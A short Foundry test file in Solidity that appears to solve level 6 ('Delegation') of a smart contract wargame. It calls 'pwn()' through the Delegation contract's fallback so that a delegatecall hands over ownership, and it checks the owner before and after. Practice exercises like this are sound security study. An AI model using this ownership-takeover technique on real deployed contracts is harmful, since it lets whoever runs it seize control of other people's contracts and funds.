// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "../src/level6.sol";

contract POC is Test {
    Delegate delegate = new Delegate(makeAddr("owner"));
    Delegation level6 = new Delegation(address(delegate));

    function test() external {
        vm.startBroadcast();

        level6.owner();
        (bool success, ) = address(level6).call(
            abi.encodeWithSignature("pwn()")
        );
        require(success);
        level6.owner();

        vm.stopBroadcast();
    }
}
